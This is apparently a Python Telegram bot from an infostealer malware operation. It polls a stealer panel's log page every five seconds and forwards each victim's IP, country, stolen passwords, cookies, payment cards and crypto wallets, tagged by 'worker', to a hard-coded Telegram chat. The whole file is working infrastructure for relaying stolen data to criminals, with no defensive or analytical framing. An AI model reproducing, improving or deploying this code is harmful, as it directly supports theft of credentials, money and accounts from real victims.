#когда-нибудь я оптимизирую этот код, но не сегодня

import logging
import asyncio
from aiogram import Bot, Dispatcher, executor, types
from config import API_TOKEN, link, data, logs_page
from main_parser import Parser, header

logging.basicConfig(level=logging.DEBUG)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
parser = Parser(link, data, header)

async def scheduled():
    while True:
        await asyncio.sleep(5)
        new_logs = parser.get_fresh_soup(logs_page)
        for one_log in new_logs:
            log = new_logs[one_log]
            tag = log['tag']
            ip = log['ip']
            country = log['country']
            #zip = log['zip']
            passwords = log['passwords']
            cookies = log['cookies']
            cards = log['cards']
            wallets = log['wallets']
            #datetime = log['datetime']

            await bot.send_message(
                -1001704554331,
                f'👨 Worker: {tag}\n'
                f'🏳️ IP: {ip}\n'
                f'🌎 Country: {country}\n\n'
                f'🔑 Passwords: {passwords}\n'
                f'🍪 Cookies: {cookies}\n'
                f'💳 Cards: {cards}\n'
                f'📊 Wallets: {wallets}\n',
                disable_notification=True
            )
        parser.clear_mem()


if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.create_task(scheduled())
    executor.start_polling(dp)